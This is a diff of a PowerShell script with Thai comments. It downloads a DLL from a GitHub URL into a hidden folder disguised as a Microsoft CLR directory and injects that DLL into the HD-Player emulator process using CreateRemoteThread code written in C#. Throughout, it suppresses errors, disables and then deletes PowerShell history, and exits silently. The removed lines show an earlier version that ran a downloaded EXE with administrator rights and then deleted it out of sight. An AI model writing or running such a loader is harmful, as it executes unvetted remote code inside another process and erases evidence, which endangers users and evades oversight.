@@ -1,8 +1,9 @@
-# 1. ตั้งค่าการทำงาน (เปิดการแจ้งเตือน Error ชั่วคราวเพื่อให้ตรวจสอบได้ง่ายขึ้น)
-$ErrorActionPreference = 'Continue'
+# 1. จัดการเรื่องประวัติและข้อผิดพลาด
+try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}
+$ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference = 'SilentlyContinue'
 
-# 2. ตั้งค่าที่อยู่โฟลเดอร์เป้าหมาย (สร้างและซ่อนโฟลเดอร์)
+# 2. ตั้งค่าที่อยู่โฟลเดอร์เป้าหมาย
 $workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
 if (Test-Path $workDir) { 
     Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue 
@@ -10,51 +11,92 @@ if (Test-Path $workDir) {
 New-Item -Path $workDir -ItemType Directory -Force | Out-Null 
 & attrib +h +s $workDir
 
-# กำหนดเส้นทางไฟล์และลิงก์ดาวน์โหลด
-$exeOutput = Join-Path $workDir "WinHelper.exe"
+# กำหนดพาธไฟล์ DLL และลิงก์ดาวน์โหลด
 $dllOutput = Join-Path $workDir "BASX.dll"
-
-$exeUrl = "https://github.com/relaxwtf777-lang/cmd/raw/refs/heads/main/BASX.exe"
 $dllUrl = "https://github.com/zenxler98-ui/BASX/raw/refs/heads/main/BASX.dll"
 $targetProcess = "HD-Player"
 
-# 3. ล้างไฟล์เก่าและดาวน์โหลดไฟล์ใหม่ทั้ง EXE และ DLL
-if (Test-Path $exeOutput) { Remove-Item $exeOutput -Force }
+# 3. ดาวน์โหลดเฉพาะไฟล์ DLL
 if (Test-Path $dllOutput) { Remove-Item $dllOutput -Force }
 
-Write-Host "กำลังดาวน์โหลดไฟล์..." -ForegroundColor Yellow
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 try {
     $wc = New-Object System.Net.WebClient
-    $wc.DownloadFile($exeUrl, $exeOutput)
     $wc.DownloadFile($dllUrl, $dllOutput)
 } catch {
-    Invoke-WebRequest -Uri $exeUrl -OutFile $exeOutput -UseBasicParsing
     Invoke-WebRequest -Uri $dllUrl -OutFile $dllOutput -UseBasicParsing
 }
 
-# 4. ตรวจสอบและสั่งรันตัวรัน (EXE) ด้วยสิทธิ์ Admin เพื่อทำการ Inject เข้า HD-Player
-if (Test-Path $exeOutput) {
-    Write-Host "กำลังเรียกใช้งานตัวรันระบบ..." -ForegroundColor Green
-    try {
-        $sh = New-Object -ComObject Shell.Application
-        $sh.ShellExecute($exeOutput, "", "", "runas", 1)
-        Start-Sleep -Seconds 3
-    } catch {
-        Start-Process -FilePath $exeOutput -Verb RunAs
+# 4. ฟังก์ชัน Inject DLL เข้า HD-Player ผ่าน Windows API
+$InjectorSource = @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Text;
+
+public class DllInjector {
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool CloseHandle(IntPtr hObject);
+
+    public static bool Inject(int processId, string dllPath) {
+        IntPtr hProcess = OpenProcess(0x1F0FFF, false, processId);
+        if (hProcess == IntPtr.Zero) return false;
+
+        IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+        if (loadLibraryAddr == IntPtr.Zero) return false;
+
+        uint size = (uint)((dllPath.Length + 1) * sizeof(char));
+        IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, size, 0x1000 | 0x2000, 0x04);
+        if (allocMemAddress == IntPtr.Zero) return false;
+
+        byte[] bytes = Encoding.ASCII.GetBytes(dllPath);
+        IntPtr bytesWritten;
+        WriteProcessMemory(hProcess, allocMemAddress, bytes, (uint)bytes.Length, out bytesWritten);
+
+        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
+        if (hThread == IntPtr.Zero) return false;
+
+        CloseHandle(hProcess);
+        return true;
     }
-} else {
-    Write-Host "ไม่พบไฟล์ตัวรัน EXE!" -ForegroundColor Red
+}
+"@
+
+# เพิ่ม Type C# เข้าไปใน PowerShell Session
+if (-not ([System.Management.Automation.PSTypeName]'DllInjector').Type) {
+    Add-Type -TypeDefinition $InjectorSource -Language CSharp
 }
 
-# 5. ตั้งเวลาลบไฟล์ EXE ทิ้งเบื้องหลังหลังผ่านไป 15 วินาที
-try {
-    $cleanCmd = "timeout /t 15 && del /f /q `"$exeOutput`""
-    Start-Process cmd -ArgumentList "/c $cleanCmd" -WindowStyle Hidden
-} catch {}
+# 5. ค้นหา Process HD-Player และทำการ Inject
+if (Test-Path $dllOutput) {
+    $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue | Select-Object -First 1
+    if ($proc) {
+        [DllInjector]::Inject($proc.Id, $dllOutput)
+    }
+}
 
-# 6. ลบประวัติ PowerShell ป้องกันการเก็บบันทึกคำสั่ง
+# 6. ลบประวัติการใช้งาน PowerShell ทันที
 try {
+    Set-PSReadlineOption -HistorySaveStyle SaveIncrementally
     Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
 } catch {}
 
-Write-Host "กระบวนการเสร็จสิ้นเรียบร้อย" -ForegroundColor Cyan
+exit
